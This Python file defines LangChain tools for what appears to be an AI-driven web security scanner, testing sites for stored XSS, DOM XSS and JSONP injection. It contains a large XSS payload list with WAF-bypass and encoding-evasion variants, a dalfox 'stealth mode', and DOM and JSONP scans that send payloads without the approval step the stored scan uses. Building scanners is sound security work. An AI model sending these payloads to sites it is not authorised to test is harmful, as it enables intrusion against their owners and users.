import json
import requests
import re
import urllib3
from urllib.parse import quote, urlparse
from langchain.tools import tool
from core.rate_limiter import rate_limiter
from core.cancellation import check_cancelled
from core.checkpoint import require_approval
from core.auth_store import get_auth_kwargs

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def _domain_of(url: str) -> str:
    try:
        return urlparse(url).netloc.split(":")[0].lower()
    except Exception:
        return url

def _logger():
    from tools.custom_tools import exec_logger
    return exec_logger


# ==========================================
# TOOL 1: Stored XSS Scanner
# ==========================================
@tool("stored_xss_scanner")
def stored_xss_scanner(url: str, params: str = "", check_url: str = "") -> str:
    """
    Scan untuk Stored (Persistent) XSS.
    Submit payload ke URL target, lalu cek apakah payload muncul di check_url.
    url: endpoint tempat submit payload (misal /api/comment, /profile)
    params: parameter yang di-test (e.g., "name,comment,bio")
    check_url: URL tempat payload seharusnya muncul setelah tersimpan (e.g., /comments, /profile/view)
               Kalau kosong, gue cek di URL yang sama setelah submit.
    """
    tool_name = "Stored XSS Scanner"
    logger = _logger()
    logger.add_log(tool_name, "START", f"Starting stored XSS scan pada {url}")
    if check_cancelled(logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."

    approved = require_approval(
        action=f"Stored XSS scan pada {url}",
        context=f"Submit XSS payload ke form/API, lalu fetch {check_url or url} untuk verifikasi persistence",
        risk="medium",
        exec_logger=logger,
    )
    if not approved:
        logger.add_log(tool_name, "BLOCKED", "Cancelled: approval rejected")
        return "SCAN DIBATALKAN: human-in-the-loop approval rejected atau timeout."

    domain = _domain_of(url)
    auth_kwargs = get_auth_kwargs(domain)
    param_list = [p.strip() for p in params.split(",")] if params else [
        "comment", "name", "bio", "description", "message",
        "title", "body", "content", "text", "note"
    ]
    verify_url = check_url if check_url else url

    # ── DALFOX CONFIRMATION FUNCTION ──────────────────────────────────────────
    def _run_dalfox_confirmation(base_url: str, verify_url: str, params: list, logger) -> dict:
        """
        Run dalfox sebagai confirmation step untuk XSS.
        Return dict dengan is_confirmed, evidence, severity.
        """
        import subprocess
        import tempfile
        import os

        tool_name = "XSS Confirmation (dalfox)"
        logger.add_log(tool_name, "PROCESSING", f"Running dalfox on {base_url}")

        try:
            # Create temp output file
            with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
                output_file = f.name

            # Run dalfox with pipe mode (URL from stdin)
            cmd = [
                "dalfox",
                "pipe",
                "--format", "json",
                "--output", output_file,
                "--timeout", "10",
                "--worker", "3",
            ]

            # Apply stealth mode if enabled
            if os.environ.get("STEALTH_MODE", "0") == "1":
                cmd.extend([
                    "--delay", "1000",
                    "--worker", "1",
                    "--timeout", "30",
                ])

            # Create input with target URL
            input_data = base_url

            result = subprocess.run(
                cmd,
                input=input_data,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=60,  # 1 minute timeout
            )

            # Check if output file has results
            findings = []
            if os.path.exists(output_file):
                with open(output_file, 'r') as f:
                    for line in f:
                        try:
                            import json
                            data = json.loads(line.strip())
                            findings.append(data)
                        except:
                            pass
                os.unlink(output_file)

            # Parse dalfox output from stdout as backup
            output = result.stdout + result.stderr

            # Check for XSS indicators
            xss_indicators = [
                "reflected",
                "xss",
                "vulnerable",
                "alert(",
                "confirmed",
            ]

            is_vulnerable = any(indicator.lower() in output.lower() for indicator in xss_indicators) or len(findings) > 0

            if is_vulnerable:
                evidence = output[:500] if output else f"Found {len(findings)} XSS findings"
                logger.add_log(tool_name, "WARNING", f"dalfox CONFIRMED XSS vulnerability")
                return {
                    "is_confirmed": True,
                    "severity": "Critical",
                    "evidence": evidence,
                    "findings": findings[:5],
                    "tool": "dalfox",
                }
            else:
                logger.add_log(tool_name, "INFO", "dalfox did not confirm XSS vulnerability")
                return {
                    "is_confirmed": False,
                    "severity": "Low",
                    "tool": "dalfox",
                    "note": "dalfox could not confirm XSS",
                }

        except subprocess.TimeoutExpired:
            logger.add_log(tool_name, "WARNING", "dalfox timed out after 60s")
            return {
                "is_confirmed": False,
                "severity": "Low",
                "tool": "dalfox",
                "note": "dalfox execution timed out",
            }
        except FileNotFoundError:
            logger.add_log(tool_name, "WARNING", "dalfox not found - skipping external confirmation")
            return {
                "is_confirmed": False,
                "severity": "Low",
                "tool": "dalfox",
                "note": "dalfox not installed",
            }
        except Exception as e:
            logger.add_log(tool_name, "WARNING", f"dalfox error: {str(e)[:100]}")
            return {
                "is_confirmed": False,
                "severity": "Low",
                "tool": "dalfox",
                "note": f"dalfox error: {str(e)[:100]}",
            }

    # Unique marker biar bisa track payload spesifik
    marker = "NEXUSXSS42"

    # ── COMPREHENSIVE XSS PAYLOAD LIBRARY ─────────────────────────────────────
    xss_payloads = [
        # Basic script injection
        f'<script>alert("{marker}")</script>',
        f'<script>alert(`{marker}`)</script>',
        f'<script>alert(1)</script>',
        f'<script>alert(document.domain)</script>',
        f'<script>alert(document.cookie)</script>',

        # Event handler-based
        f'<img src=x onerror=alert("{marker}")>',
        f'<svg onload=alert("{marker}")>',
        f'<body onload=alert("{marker}")>',
        f'<details open ontoggle=alert("{marker}")>',
        f'<input onfocus=alert("{marker}") autofocus>',
        f'<marquee onstart=alert("{marker}")>',
        f'<video><source onerror=alert("{marker}")>',
        f'<audio src=x onerror=alert("{marker}")>',
        f'<object data="javascript:alert(\'{marker}\')">',
        f'<iframe onload=alert("{marker}")>',

        # Attribute injection
        f'" onmouseover=alert("{marker}") "',
        f"' onmouseover=alert('{marker}') '",
        f'" onfocus=alert("{marker}") "',
        f"' onfocus=alert('{marker}') '",
        f'" onmouseover=alert("{marker}")',
        f"' onmouseover=alert('{marker}')",

        # Tag-based bypass
        f'<scr<script>ipt>alert("{marker}")</scr</script>ipt>',
        f'<scr\x00ipt>alert("{marker}")</script>',
        f'<scrip<script></script>t>alert("{marker}")</script>',
        f'<ScRiPt>alert("{marker}")</ScRiPt>',
        f'<SCRIPT>alert("{marker}")</SCRIPT>',

        # Encoding bypass
        f'&#60;script&#62;alert("{marker}")&#60;/script&#62;',
        f'&#x3C;script&#x3E;alert("{marker}")&#x3C;/script&#x3E;',
        f'\x3cscript\x3ealert("{marker}")\x3c/script\x3e',

        # HTML entities
        f'&lt;script&gt;alert("{marker}")&lt;/script&gt;',
        f'&lt;script&gt;alert(&#39;{marker}&#39;)&lt;/script&gt;',

        # Template literal
        f'${{alert("{marker}")}}',
        f'{{constructor.constructor("alert(\\"{marker}\\")")()}}',

        # SVG-based
        f'<svg/onload=alert("{marker}")>',
        f'<svg onload=alert("{marker}")>',
        f'<svg><script>alert("{marker}")</script></svg>',
        f'<svg><animate onbegin=alert("{marker}") attributeName=x dur=1s>',

        # Polyglot payloads
        f'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */onerror=alert("{marker}"))//',

        # CSS-based
        f'<div style="background:url(javascript:alert(\'{marker}\'))">',
        f'<div style="width:expression(alert(\'{marker}\'))">',

        # Frame-based
        f'<iframe src="javascript:alert(\'{marker}\')">',
        f'<object type="text/html" data="javascript:alert(\'{marker}\')">',

        # Data URI
        f'<a href="data:text/html,<script>alert(\'{marker}\')</script>">Click</a>',

        # Null byte bypass
        f'<scri%00pt>alert("{marker}")</script>',
        f'<scr%00ipt>alert("{marker}")</script>',

        # Case variation
        f'<ScRiPt>alert("{marker}")</ScRiPt>',
        f'<SCRIPT>alert("{marker}")</SCRIPT>',

        # Double encoding
        f'%253Cscript%253Ealert("{marker}")%253C/script%253E',

        # Mutation XSS
        f'<noscript><p title="</noscript><script>alert(\'{marker}\')"></p></noscript>',

        # Template injection
        f'{{alert("{marker}")}}',
        f'${alert("{marker}")}',
        f'<%=alert("{marker}")%>',

        # WAF bypass patterns
        f'<img src="x" onerror="&#97;lert(\'{marker}\')">',
        f'<img src="x" onerror="eval(atob(\'YWxlcnQoJ3t7bWFya2VyfX0nKQ==\'))">',
        f'<svg onload="window[\'al\'+\'ert\'](\'{marker}\')">',
        f'<svg onload="self[\'al\'+\'ert\'](\'{marker}\')">',

        # DOM clobbering
        f'<a href="javascript:alert(\'{marker}\')" id="xss">click</a>',

        # Template engines
        f'{{constructor.constructor("alert(\'{marker}\')")()}}',
        f'${{this.constructor.constructor("alert(\'{marker}\')")()}}',
    ]

    vulnerabilities = []

    for param in param_list:
        if check_cancelled(logger): break
        for payload in xss_payloads:
            try:
                # Step 1: Submit payload
                rate_limiter.wait(domain)
                # Try POST first (common for stored XSS)
                post_resp = requests.post(
                    url,
                    data={param: payload},
                    timeout=5, verify=False
                )

                # Step 2: Fetch verify URL to check persistence
                rate_limiter.wait(domain)
                get_resp = requests.get(verify_url, timeout=5, verify=False)

                if marker in get_resp.text or payload in get_resp.text:
                    vulnerabilities.append({
                        "parameter": param,
                        "payload": payload,
                        "type": "Stored XSS",
                        "submit_status": post_resp.status_code,
                        "found_at": verify_url,
                        "severity": "High"
                    })
                    logger.add_log(tool_name, "WARNING", f"Stored XSS confirmed: param={param}, found at {verify_url}")
                    break  # confirmed for this param, move on
            except Exception:
                pass

    # ── DALFOX CONFIRMATION STEP ──────────────────────────────────────────────
    if vulnerabilities:
        dalfox_result = _run_dalfox_confirmation(url, verify_url, param_list, logger)
        if dalfox_result.get("is_confirmed"):
            # Enhance existing findings with dalfox confirmation
            for vuln in vulnerabilities:
                vuln["dalfox_confirmed"] = True
                vuln["dalfox_evidence"] = dalfox_result.get("evidence", "")
                vuln["severity"] = "Critical"
                logger.add_log(tool_name, "WARNING",
                    f"dalfox CONFIRMED XSS on {vuln['parameter']}")
        else:
            # Keep findings but mark as custom detection only
            for vuln in vulnerabilities:
                vuln["dalfox_confirmed"] = False
                vuln["note"] = "Detected by custom scanner, not confirmed by dalfox"
                logger.add_log(tool_name, "INFO",
                    "dalfox did not confirm XSS - keeping as medium confidence")

    result = {
        "status": "VULNERABLE" if vulnerabilities else "SAFE",
        "vulnerabilities": vulnerabilities,
        "count": len(vulnerabilities),
        "note": "For comprehensive stored XSS testing, provide check_url where submitted data appears"
    }
    logger.add_log(tool_name, "SUCCESS", f"Stored XSS scan selesai. Found: {len(vulnerabilities)}")
    return json.dumps(result, indent=2)


# ==========================================
# TOOL 2: DOM XSS Scanner
# ==========================================
@tool("dom_xss_scanner")
def dom_xss_scanner(url: str) -> str:
    """
    Scan untuk DOM-based XSS using Playwright (headless browser).
    Analyzes dangerous JavaScript sinks: innerHTML, eval, document.write,
    location.href, outerHTML, insertAdjacentHTML, setTimeout with string, dll.
    Juga checks URL fragment (#) based injection.
    """
    tool_name = "DOM XSS Scanner"
    logger = _logger()
    logger.add_log(tool_name, "START", f"Starting DOM XSS scan pada {url}")
    if check_cancelled(logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."

    findings = {
        "target": url,
        "dangerous_sinks": [],
        "injectable_sources": [],
        "vulnerabilities": []
    }

    try:
        from playwright.sync_api import sync_playwright

        dom_xss_payloads = [
            f"{url}#<img src=x onerror=alert(1)>",
            f"{url}?q=<script>alert(1)</script>",
            f"{url}?search=<img src=x onerror=alert(1)>",
            f"{url}#javascript:alert(1)",
        ]

        # Dangerous JS sinks to search for in page source
        dangerous_sinks = [
            "innerHTML", "outerHTML", "document.write", "document.writeln",
            "insertAdjacentHTML", "eval(", "setTimeout(", "setInterval(",
            "location.href", "location.hash", "location.search",
            "window.location", "document.location",
        ]

        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            context = browser.new_context()
            page = context.new_page()

            # Track JS errors / alerts
            alerts_triggered = []
            page.on("dialog", lambda dialog: (alerts_triggered.append(dialog.message), dialog.dismiss()))

            # 1. Analyze page source for dangerous sinks
            logger.add_log(tool_name, "PROCESSING", "Analyzing JavaScript for dangerous sinks")
            try:
                page.goto(url, timeout=10000)
                page_content = page.content()

                for sink in dangerous_sinks:
                    if sink in page_content:
                        findings["dangerous_sinks"].append(sink)

                if findings["dangerous_sinks"]:
                    logger.add_log(tool_name, "WARNING",
                        f"Dangerous JS sinks found: {findings['dangerous_sinks']}")
            except Exception as e:
                logger.add_log(tool_name, "WARNING", f"Could not load page: {e}")

            # 2. Test DOM XSS payloads
            logger.add_log(tool_name, "PROCESSING", "Testing DOM XSS payloads")
            for payload_url in dom_xss_payloads:
                if check_cancelled(logger): break
                try:
                    alerts_triggered.clear()
                    page.goto(payload_url, timeout=8000)
                    page.wait_for_timeout(1500)  # wait for JS execution

                    if alerts_triggered:
                        findings["vulnerabilities"].append({
                            "type": "DOM XSS",
                            "payload_url": payload_url,
                            "alert_triggered": alerts_triggered[0],
                            "severity": "High"
                        })
                        logger.add_log(tool_name, "WARNING", f"DOM XSS confirmed: {payload_url}")
                except Exception:
                    pass

            # 3. Check URL fragment injection
            logger.add_log(tool_name, "PROCESSING", "Checking URL fragment (hash) sources")
            try:
                page.goto(f"{url}#test_fragment_nexus", timeout=8000)
                page_src = page.content()
                if "test_fragment_nexus" in page_src:
                    findings["injectable_sources"].append({
                        "source": "URL Fragment (location.hash)",
                        "detail": "Hash value reflected in DOM — potential DOM XSS source",
                        "severity": "Medium"
                    })
                    logger.add_log(tool_name, "WARNING", "URL fragment reflected in DOM")
            except Exception:
                pass

            browser.close()

    except ImportError:
        logger.add_log(tool_name, "WARNING", "Playwright not available — falling back to static analysis")
        # Fallback: static analysis via requests
        try:
            from core.rate_limiter import rate_limiter as rl
            rl.wait(_domain_of(url))
            r = requests.get(url, timeout=8, verify=False)
            for sink in ["innerHTML", "document.write", "eval(", "location.hash"]:
                if sink in r.text:
                    findings["dangerous_sinks"].append(sink)
            findings["note"] = "Static analysis only — install playwright for full DOM XSS testing"
        except Exception:
            pass

    except Exception as e:
        logger.add_log(tool_name, "ERROR", f"DOM XSS scan error: {str(e)}")
        findings["error"] = str(e)

    result = {
        "status": "VULNERABLE" if findings["vulnerabilities"] else (
            "SUSPICIOUS" if findings["dangerous_sinks"] else "SAFE"
        ),
        "findings": findings,
        "summary": {
            "dangerous_sinks_count": len(findings["dangerous_sinks"]),
            "confirmed_vulnerabilities": len(findings["vulnerabilities"])
        }
    }
    logger.add_log(tool_name, "SUCCESS", "DOM XSS scan complete")
    return json.dumps(result, indent=2)


# ==========================================
# TOOL 3: JSONP Injection Scanner
# ==========================================
@tool("jsonp_injection_scanner")
def jsonp_injection_scanner(url: str) -> str:
    """
    Scan untuk JSONP Injection vulnerability.
    JSONP endpoints yang pake user-controlled callback parameter rentan
    terhadap data theft dan XSS. Cek apakah callback param bisa di-inject.
    """
    tool_name = "JSONP Injection Scanner"
    logger = _logger()
    logger.add_log(tool_name, "START", f"Starting JSONP injection scan pada {url}")
    if check_cancelled(logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."

    domain = _domain_of(url)
    auth_kwargs = get_auth_kwargs(domain)
    findings = {"vulnerabilities": [], "jsonp_endpoints": []}

    # Common JSONP callback parameter names
    callback_params = ["callback", "cb", "jsonp", "jsonpcallback", "func", "fn", "handler"]
    xss_payload = "alert(1)//"
    xss_payload2 = "<script>alert(1)</script>"

    for cb_param in callback_params:
        try:
            rate_limiter.wait(domain)
            # Test 1: Benign callback name
            test_url = f"{url}{'&' if '?' in url else '?'}{cb_param}=nexusCallback"
            r = requests.get(test_url, timeout=5, verify=False)

            if "nexusCallback" in r.text and r.text.strip().startswith("nexusCallback("):
                logger.add_log(tool_name, "WARNING", f"JSONP endpoint detected: param={cb_param}")
                findings["jsonp_endpoints"].append({
                    "param": cb_param,
                    "url": test_url,
                    "response_preview": r.text[:100]
                })

                # Test 2: Try XSS via callback
                rate_limiter.wait(domain)
                xss_url = f"{url}{'&' if '?' in url else '?'}{cb_param}={quote(xss_payload)}"
                xss_r = requests.get(xss_url, timeout=5, verify=False)

                if xss_payload in xss_r.text:
                    findings["vulnerabilities"].append({
                        "type": "JSONP Injection / XSS",
                        "callback_param": cb_param,
                        "url": xss_url,
                        "severity": "High",
                        "detail": "Arbitrary callback name reflected — attackers can steal JSONP response data"
                    })
                    logger.add_log(tool_name, "WARNING", f"JSONP XSS confirmed: {cb_param}")
                    break

        except Exception:
            pass

    result = {
        "status": "VULNERABLE" if findings["vulnerabilities"] else (
            "SUSPICIOUS" if findings["jsonp_endpoints"] else "SAFE"
        ),
        "findings": findings,
        "note": "JSONP endpoints without XSS may still leak data to cross-origin pages"
    }
    logger.add_log(tool_name, "SUCCESS", "JSONP injection scan complete")
    return json.dumps(result, indent=2)
